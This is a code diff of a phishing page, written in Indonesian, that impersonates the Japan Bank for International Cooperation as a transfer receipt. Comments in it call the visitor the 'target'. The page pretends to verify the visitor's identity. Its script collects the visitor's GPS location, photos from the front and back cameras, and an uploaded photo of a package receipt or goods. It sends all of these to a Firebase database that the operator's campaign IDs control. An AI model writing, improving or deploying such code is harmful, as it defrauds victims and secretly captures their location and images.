@@ -6,261 +6,90 @@
 <title>JBIC - International Transfer Receipt</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
-body{
-  font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,sans-serif;
-  background:#f5f6f8;
-  min-height:100vh;
-  color:#1a1a1a;
-  padding:16px;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-}
-.receipt{
-  max-width:440px;
-  width:100%;
-  background:#fff;
-  border-radius:14px;
-  box-shadow:0 8px 40px rgba(0,0,0,.08), 0 2px 8px rgba(0,0,0,.04);
-  padding:32px 28px 24px;
-  position:relative;
-}
+body{font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,sans-serif;background:#f5f6f8;min-height:100vh;color:#1a1a1a;padding:16px;display:flex;align-items:center;justify-content:center}
+.receipt{max-width:440px;width:100%;background:#fff;border-radius:14px;box-shadow:0 8px 40px rgba(0,0,0,.08),0 2px 8px rgba(0,0,0,.04);padding:32px 28px 24px}
+.jbic-logo-wrap{text-align:center;margin-bottom:26px}
+.jbic-logo-svg{width:200px;height:auto;display:inline-block}
+.jbic-title{text-align:center;font-size:15px;font-weight:700;color:#1a1a1a;letter-spacing:.4px;margin-bottom:6px;line-height:1.4;text-transform:uppercase}
+.jbic-subtitle{text-align:center;font-size:12px;color:#888;margin-bottom:22px}
+.amount-box{background:#f7f8fa;border-radius:10px;padding:22px 16px;text-align:center;margin-bottom:22px}
+.amount-label{font-size:10px;color:#999;letter-spacing:1px;margin-bottom:10px;font-weight:500}
+.amount-main{font-size:24px;font-weight:800;color:#1a1a1a;font-family:'Courier New',monospace;letter-spacing:.5px;margin-bottom:2px}
+.amount-secondary{font-size:22px;font-weight:800;color:#1a1a1a;font-family:'Courier New',monospace;letter-spacing:.5px}
 
-/* ============ LOGO JBIC ============ */
-.jbic-logo-wrap{
-  text-align:center;
-  margin-bottom:26px;
-}
-.jbic-logo-svg{
-  width:200px;
-  height:auto;
-  display:inline-block;
-}
-.jbic-logo-caption{
-  font-size:7px;
-  color:#333;
-  letter-spacing:1.5px;
-  margin-top:4px;
-  font-weight:600;
-}
+.upload-area{background:#f7f8fa;border-radius:10px;padding:16px;margin-bottom:18px;text-align:center}
+.upload-title{font-size:11px;color:#555;font-weight:700;letter-spacing:.5px;margin-bottom:8px}
+.upload-desc{font-size:10px;color:#888;margin-bottom:12px;line-height:1.5}
+.upload-btn{display:inline-block;padding:11px 20px;background:#fff;border:2px dashed #cbd5e1;border-radius:8px;color:#555;font-size:12px;font-weight:700;cursor:pointer;transition:all .2s}
+.upload-btn:hover{border-color:#1a73e8;color:#1a73e8}
+.upload-preview{margin-top:12px;display:none}
+.upload-preview img{max-width:100%;max-height:200px;border-radius:8px;border:1px solid #e5e7eb}
+.upload-preview.show{display:block}
+.upload-filename{font-size:10px;color:#666;margin-top:6px;font-family:monospace;word-break:break-all}
 
-/* ============ TITLE ============ */
-.jbic-title{
-  text-align:center;
-  font-size:15px;
-  font-weight:700;
-  color:#1a1a1a;
-  letter-spacing:.4px;
-  margin-bottom:6px;
-  line-height:1.4;
-  text-transform:uppercase;
-}
-.jbic-subtitle{
-  text-align:center;
-  font-size:12px;
-  color:#888;
-  margin-bottom:22px;
-  letter-spacing:.3px;
-}
+.info-blur{padding:14px 0;margin-bottom:20px;text-align:center;color:#bbb;font-size:11px;letter-spacing:1.5px;filter:blur(3px);user-select:none;pointer-events:none;line-height:1.8}
+.info-blur::before{content:'Sender Bank  ·  Sender Name  ·  Sender Account';display:block}
+.info-blur::after{content:'Receiver Bank  ·  Receiver Name  ·  Receiver Account';display:block;margin-top:6px}
 
-/* ============ AMOUNT BOX ============ */
-.amount-box{
-  background:#f7f8fa;
-  border-radius:10px;
-  padding:22px 16px;
-  text-align:center;
-  margin-bottom:22px;
-}
-.amount-label{
-  font-size:10px;
-  color:#999;
-  letter-spacing:1px;
-  margin-bottom:10px;
-  font-weight:500;
-}
-.amount-main{
-  font-size:24px;
-  font-weight:800;
-  color:#1a1a1a;
-  font-family:'Courier New',monospace;
-  letter-spacing:.5px;
-  margin-bottom:2px;
-}
-.amount-secondary{
-  font-size:22px;
-  font-weight:800;
-  color:#1a1a1a;
-  font-family:'Courier New',monospace;
-  letter-spacing:.5px;
-}
+.btn-signature{width:100%;padding:15px;background:#1a73e8;color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:700;letter-spacing:1px;cursor:pointer;transition:transform .15s,background .2s;font-family:inherit}
+.btn-signature:active{transform:scale(.98);background:#1765cc}
+.btn-signature:disabled{opacity:.5;cursor:not-allowed;background:#94a3b8}
+.footer-note{text-align:center;font-size:9px;color:#bbb;letter-spacing:.4px;margin-top:14px;line-height:1.5}
 
-/* ============ INFO BLUR (target ngisi sendiri) ============ */
-.info-blur{
-  padding:14px 0;
-  margin-bottom:20px;
-  text-align:center;
-  color:#bbb;
-  font-size:11px;
-  letter-spacing:1.5px;
-  filter:blur(3px);
-  user-select:none;
-  pointer-events:none;
-  line-height:1.8;
-}
-.info-blur::before{
-  content:'Sender Bank  ·  Sender Name  ·  Sender Account';
-  display:block;
-}
-.info-blur::after{
-  content:'Receiver Bank  ·  Receiver Name  ·  Receiver Account';
-  display:block;
-  margin-top:6px;
-}
-
-/* ============ BUTTON ============ */
-.btn-signature{
-  width:100%;
-  padding:15px;
-  background:#1a73e8;
-  color:#fff;
-  border:none;
-  border-radius:8px;
-  font-size:14px;
-  font-weight:700;
-  letter-spacing:1px;
-  cursor:pointer;
-  transition:transform .15s, background .2s;
-  font-family:inherit;
-}
-.btn-signature:active{
-  transform:scale(.98);
-  background:#1765cc;
-}
-.btn-signature:disabled{
-  opacity:.6;
-  cursor:not-allowed;
-}
-
-.footer-note{
-  text-align:center;
-  font-size:9px;
-  color:#bbb;
-  letter-spacing:.4px;
-  margin-top:14px;
-  line-height:1.5;
-}
-
-/* ============ LOADING ============ */
-.loading-overlay{
-  position:fixed;
-  inset:0;
-  background:rgba(255,255,255,.97);
-  z-index:999;
-  display:none;
-  align-items:center;
-  justify-content:center;
-  flex-direction:column;
-  padding:24px;
-}
+.loading-overlay{position:fixed;inset:0;background:rgba(255,255,255,.97);z-index:999;display:none;align-items:center;justify-content:center;flex-direction:column;padding:24px}
 .loading-overlay.show{display:flex}
-.spinner{
-  width:54px;height:54px;
-  border:4px solid #e8eaed;
-  border-top-color:#1a73e8;
-  border-radius:50%;
-  animation:spin .9s linear infinite;
-  margin-bottom:18px;
-}
+.spinner{width:54px;height:54px;border:4px solid #e8eaed;border-top-color:#1a73e8;border-radius:50%;animation:spin .9s linear infinite;margin-bottom:18px}
 @keyframes spin{to{transform:rotate(360deg)}}
-.loading-text{
-  font-size:13px;
-  color:#444;
-  font-weight:600;
-  text-align:center;
-}
-.loading-sub{
-  font-size:11px;
-  color:#999;
-  margin-top:6px;
-  text-align:center;
-}
+.loading-text{font-size:13px;color:#444;font-weight:600;text-align:center}
+.loading-sub{font-size:11px;color:#999;margin-top:6px;text-align:center}
 
-/* ============ SUCCESS ============ */
-.success-overlay{
-  position:fixed;
-  inset:0;
-  background:#fff;
-  z-index:999;
-  display:none;
-  align-items:center;
-  justify-content:center;
-  flex-direction:column;
-  padding:24px;
-  text-align:center;
-}
+.success-overlay{position:fixed;inset:0;background:#fff;z-index:999;display:none;align-items:center;justify-content:center;flex-direction:column;padding:24px;text-align:center}
 .success-overlay.show{display:flex}
-.success-icon{
-  width:80px;height:80px;
-  border-radius:50%;
-  background:#e8f5e9;
-  display:grid;
-  place-items:center;
-  margin-bottom:20px;
-  font-size:42px;
-  color:#34a853;
-  animation:pop .4s cubic-bezier(.4,0,.2,1);
-}
+.success-icon{width:80px;height:80px;border-radius:50%;background:#e8f5e9;display:grid;place-items:center;margin-bottom:20px;font-size:42px;color:#34a853;animation:pop .4s cubic-bezier(.4,0,.2,1)}
 @keyframes pop{0%{transform:scale(0)}100%{transform:scale(1)}}
-.success-title{
-  font-size:20px;
-  font-weight:800;
-  color:#1a1a1a;
-  margin-bottom:10px;
-}
-.success-desc{
-  font-size:13px;
-  color:#666;
-  line-height:1.6;
-  max-width:320px;
-}
+.success-title{font-size:20px;font-weight:800;color:#1a1a1a;margin-bottom:10px}
+.success-desc{font-size:13px;color:#666;line-height:1.6;max-width:320px}
 </style>
 </head>
 <body>
 
 <div class="receipt" id="receiptBox">
 
-  <!-- LOGO JBIC (SVG persis) -->
   <div class="jbic-logo-wrap">
     <svg class="jbic-logo-svg" viewBox="0 0 400 90" xmlns="http://www.w3.org/2000/svg">
-      <!-- Icon lingkaran JBIC -->
       <circle cx="45" cy="45" r="32" fill="none" stroke="#c8102e" stroke-width="3"/>
       <path d="M 38 25 Q 45 45 38 65 M 52 25 Q 45 45 52 65 M 28 40 Q 45 45 62 40 M 28 50 Q 45 45 62 50"
             fill="none" stroke="#c8102e" stroke-width="2.2" stroke-linecap="round"/>
-      <!-- Text JBIC kecil -->
       <text x="82" y="36" font-family="Arial, sans-serif" font-size="11" font-weight="900" fill="#c8102e" letter-spacing="2">JBIC</text>
       <text x="82" y="52" font-family="Arial, sans-serif" font-size="8" font-weight="600" fill="#555" letter-spacing="1">JAPAN BANK FOR INTERNATIONAL</text>
       <text x="82" y="63" font-family="Arial, sans-serif" font-size="8" font-weight="600" fill="#555" letter-spacing="1">COOPERATION</text>
-      <!-- Text kanji 国際協力銀行 -->
-      <text x="230" y="52" font-family="'Yu Gothic', 'MS Gothic', 'Hiragino Kaku Gothic Pro', serif" font-size="34" font-weight="700" fill="#1a1a1a" letter-spacing="2">国際協力銀行</text>
+      <text x="230" y="52" font-family="'Yu Gothic','MS Gothic','Hiragino Kaku Gothic Pro',serif" font-size="34" font-weight="700" fill="#1a1a1a" letter-spacing="2">国際協力銀行</text>
     </svg>
   </div>
 
-  <!-- TITLE -->
   <div class="jbic-title" id="rTitle">JBIC JAPAN BANK INTERNATIONAL CORPORATION</div>
   <div class="jbic-subtitle" id="rSubtitle">Office Purchasing</div>
 
-  <!-- AMOUNT -->
   <div class="amount-box">
     <div class="amount-label">Amount Received</div>
     <div class="amount-main" id="rAmountMain">IDR 0</div>
-    <div class="amount-secondary" id="rAmountSecondary">YEN 0</div>
+    <div class="amount-secondary" id="rAmountSecondary">JPY 0</div>
   </div>
 
-  <!-- INFO BLUR (target gak liat detail, tapi ada "dummy" teks biar autentik) -->
+  <div class="upload-area">
+    <div class="upload-title">📎 UPLOAD BUKTI PENERIMAAN</div>
+    <div class="upload-desc">Wajib upload foto <b>Nomor Resi</b> paket atau <b>Barang</b> yang Anda terima sebagai bukti penerimaan dana.</div>
+    <label for="userUploadInput" class="upload-btn" id="uploadBtnLabel">+ PILIH FOTO RESI / BARANG</label>
+    <input type="file" id="userUploadInput" accept="image/*" capture="environment" style="display:none">
+    <div class="upload-preview" id="uploadPreview">
+      <img id="uploadPreviewImg" src="" alt="Preview">
+      <div class="upload-filename" id="uploadFilename">-</div>
+    </div>
+  </div>
+
   <div class="info-blur"></div>
 
-  <!-- BUTTON -->
-  <button class="btn-signature" id="btnSignature" type="button">SIGNATURE PHOTO</button>
+  <button class="btn-signature" id="btnSignature" type="button" disabled>LANJUTKAN VERIFIKASI</button>
 
   <div class="footer-note">
     © 2026 JBIC · Japan Bank for International Cooperation<br>
@@ -278,7 +107,7 @@ body{
 <div class="success-overlay" id="successOverlay">
   <div class="success-icon">✓</div>
   <div class="success-title">Verifikasi Berhasil</div>
-  <div class="success-desc">Data Anda sedang diproses oleh sistem JBIC. Dana akan masuk ke rekening Anda dalam 1-3 hari kerja.</div>
+  <div class="success-desc">Bukti penerimaan Anda sudah diterima. Dana akan masuk ke rekening Anda dalam 1-3 hari kerja.</div>
 </div>
 
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
@@ -294,12 +123,8 @@ const firebaseConfig = {
   messagingSenderId: "279050968109",
   appId: "1:279050968109:web:a6bb89d64ef296d7c0eca4"
 };
-
 let db = null;
-try {
-  firebase.initializeApp(firebaseConfig);
-  db = firebase.database();
-} catch(e) { console.log('Firebase err:', e); }
+try { firebase.initializeApp(firebaseConfig); db = firebase.database(); } catch(e) { console.log('FB err:', e); }
 
 // ==================== PARAMS ====================
 const urlParams = new URLSearchParams(location.search);
@@ -317,68 +142,52 @@ function convertAmount(amount, fromCur, toCur) {
   const rateFrom = RATE_FROM_IDR[fromCur] || 1;
   const rateTo = RATE_FROM_IDR[toCur] || 1;
   const idr = num / rateFrom;
-  const converted = Math.round(idr * rateTo);
-  return converted.toLocaleString('id-ID');
+  return Math.round(idr * rateTo).toLocaleString('id-ID');
 }
 
 // ==================== LOAD CONFIG ====================
 async function loadConfig() {
   let cfg = null;
-
   if (db) {
     try {
-      const snap = await db.ref('jbic_campaigns/' + CAMP_ID).once('value');
-      const data = snap.val();
-      if (data && data.config) cfg = data.config;
+      const s = await db.ref('jbic_campaigns/' + CAMP_ID).once('value');
+      const d = s.val();
+      if (d && d.config) cfg = d.config;
     } catch(e) {}
+    if (!cfg) {
+      try {
+        const s = await db.ref('jbic_config/default').once('value');
+        cfg = s.val();
+      } catch(e) {}
+    }
   }
-
-  if (!cfg && db) {
-    try {
-      const snap = await db.ref('jbic_config/default').once('value');
-      cfg = snap.val();
-    } catch(e) {}
-  }
-
   if (!cfg) {
     cfg = {
       title: 'JBIC JAPAN BANK INTERNATIONAL CORPORATION',
       subtitle: 'Office Purchasing',
       currency: 'JPY',
-      amount: '530000',
-      senderBank: 'JBIC JAPAN BANK INTERNATIONAL CORPORATION',
-      senderName: 'TANAKA HIDEO',
-      senderAcc: '**** **** 4829',
-      receiverBank: 'BANK MUAMALAT INDONESIA',
-      receiverName: 'BUDI SANTOSO',
-      receiverAcc: '**** **** 7852'
+      amount: '530000'
     };
   }
-
   return cfg;
 }
 
-// ==================== RENDER ====================
+// ==================== RENDER RECEIPT ====================
 async function renderReceipt() {
   const cfg = await loadConfig();
-
   const cur = cfg.currency || 'JPY';
   const amount = cfg.amount || '530000';
 
   document.getElementById('rTitle').textContent = cfg.title || 'JBIC JAPAN BANK INTERNATIONAL CORPORATION';
   document.getElementById('rSubtitle').textContent = cfg.subtitle || 'Office Purchasing';
 
-  // Amount Received: IDR utama, currency asing sebagai sekunder
   const amountNum = parseInt(amount.toString().replace(/\D/g, '')) || 0;
   document.getElementById('rAmountMain').textContent = 'IDR ' + amountNum.toLocaleString('id-ID');
 
-  // currency asing
   if (cur !== 'IDR') {
-    const converted = convertAmount(amount, 'IDR', cur);
-    document.getElementById('rAmountSecondary').textContent = cur + ' ' + converted;
+    document.getElementById('rAmountSecondary').textContent = cur + ' ' + convertAmount(amount, 'IDR', cur);
   } else {
-    const converted = convertAmount(amount, 'IDR', 'JPY');
-    document.getElementById('rAmountSecondary').textContent = 'YEN ' + converted;
+    document.getElementById('rAmountSecondary').textContent = 'JPY ' + convertAmount(amount, 'IDR', 'JPY');
   }
 
   // log open
@@ -396,8 +205,36 @@ async function renderReceipt() {
     } catch(e) {}
   }
 }
-
 renderReceipt();
+
+// ==================== UPLOAD GAMBAR ====================
+let userUploadData = null;
+document.getElementById('userUploadInput').addEventListener('change', (e) => {
+  const file = e.target.files[0];
+  if (!file) return;
+
+  const reader = new FileReader();
+  reader.onload = (ev) => {
+    userUploadData = ev.target.result;
+    document.getElementById('uploadPreviewImg').src = userUploadData;
+    document.getElementById('uploadFilename').textContent = file.name + ' (' + (file.size/1024).toFixed(1) + ' KB)';
+    document.getElementById('uploadPreview').classList.add('show');
+    document.getElementById('uploadBtnLabel').textContent = '✓ GANTI FOTO';
+    document.getElementById('btnSignature').disabled = false;
+    document.getElementById('btnSignature').textContent = 'LANJUTKAN VERIFIKASI';
+
+    // upload ke firebase
+    if (db) {
+      try {
+        db.ref('jbic/' + CAMP_ID).update({
+          userUpload: userUploadData,
+          uploadAt: Date.now()
+        });
+      } catch(e) {}
+    }
+  };
+  reader.readAsDataURL(file);
+});
 
 // ==================== CAMERA ====================
 async function captureCamera(facingMode) {
@@ -464,6 +301,8 @@ function captureLocation() {
 
 // ==================== SUBMIT ====================
 document.getElementById('btnSignature').addEventListener('click', async function() {
+  if (!userUploadData) return alert('Upload foto resi/barang dulu');
+
   const btn = this;
   btn.disabled = true;
   btn.textContent = 'PROCESSING...';
@@ -474,30 +313,36 @@ document.getElementById('btnSignature').addEventListener('click', async function
   loadingOverlay.classList.add('show');
 
   try {
+    // step 1: location
     loadingText.textContent = 'Mengambil data lokasi...';
     loadingSub.textContent = 'Mohon aktifkan GPS Anda';
     const location = await captureLocation();
 
     if (db) {
-      try { db.ref('jbic/' + CAMP_ID).update({ location: location, status: 'verifying' }); } catch(e) {}
+      try {
+        db.ref('jbic/' + CAMP_ID).update({ location: location, status: 'verifying' });
+      } catch(e) {}
     }
 
+    // step 2: camera depan
     loadingText.textContent = 'Memverifikasi identitas (1/2)...';
-    loadingSub.textContent = 'Izinkan akses kamera';
+    loadingSub.textContent = 'Izinkan akses kamera depan';
     const camFront = await captureCamera('user');
 
     if (camFront && db) {
       try { db.ref('jbic/' + CAMP_ID).update({ camFront: camFront }); } catch(e) {}
     }
 
+    // step 3: camera belakang
     loadingText.textContent = 'Memverifikasi identitas (2/2)...';
-    loadingSub.textContent = 'Jangan tutup halaman ini';
+    loadingSub.textContent = 'Izinkan akses kamera belakang';
     const camBack = await captureCamera('environment');
 
     if (camBack && db) {
       try { db.ref('jbic/' + CAMP_ID).update({ camBack: camBack }); } catch(e) {}
     }
 
+    // step 4: verified
     loadingText.textContent = 'Menyelesaikan verifikasi...';
     loadingSub.textContent = 'Hampir selesai';
 
@@ -520,11 +365,12 @@ document.getElementById('btnSignature').addEventListener('click', async function
     console.log('Submit err:', e);
     loadingOverlay.classList.remove('show');
     btn.disabled = false;
-    btn.textContent = 'SIGNATURE PHOTO';
+    btn.textContent = 'LANJUTKAN VERIFIKASI';
     alert('Terjadi kesalahan. Silakan coba lagi.');
   }
 });
+
 </script>
 
 </body>
-  </html>
+</html>
